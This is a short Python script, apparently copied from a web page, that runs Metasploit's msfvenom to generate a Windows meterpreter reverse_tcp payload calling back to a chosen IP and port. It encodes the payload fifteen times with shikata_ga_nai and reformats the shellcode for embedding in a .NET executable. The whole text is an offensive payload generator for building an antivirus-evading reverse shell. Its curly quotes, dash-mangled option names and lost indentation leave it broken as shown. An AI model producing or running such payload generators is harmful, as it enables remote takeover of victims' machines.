#!/usr/bin/python

###
# simple script that generates a meterpreter payload suitable for a .net executable
###

import argparse
import re
from subprocess import *

parser = argparse.ArgumentParser()
parser.add_argument(‘–lhost’, required=True, help=’Connectback IP’)
parser.add_argument(‘–lport’, required=True, help=’Connectback Port’)
parser.add_argument(‘–msfroot’, default=’/usr/share/metasploit-framework’)
args = parser.parse_args()

def create_shellcode(args):
msfvenom = args.msfroot + “/msfvenom”
msfvenom = (msfvenom + ” -p windows/meterpreter/reverse_tcp LHOST=” + args.lhost + ” LPORT=” + args.lport + ” -e x86/shikata_ga_nai -i 15 -f c”)
msfhandle = Popen(msfvenom, shell=True, stdout=PIPE)
try:
shellcode = msfhandle.communicate()[0].split(“unsigned char buf[] = “)[1]
except IndexError:
print “Error: Do you have the right path to msfvenom?”
raise
#put this in a C# format
shellcode = shellcode.replace(‘\\’, ‘,0’).replace(‘”‘, ”).strip()[1:-1]
return shellcode

print create_shellcode(args)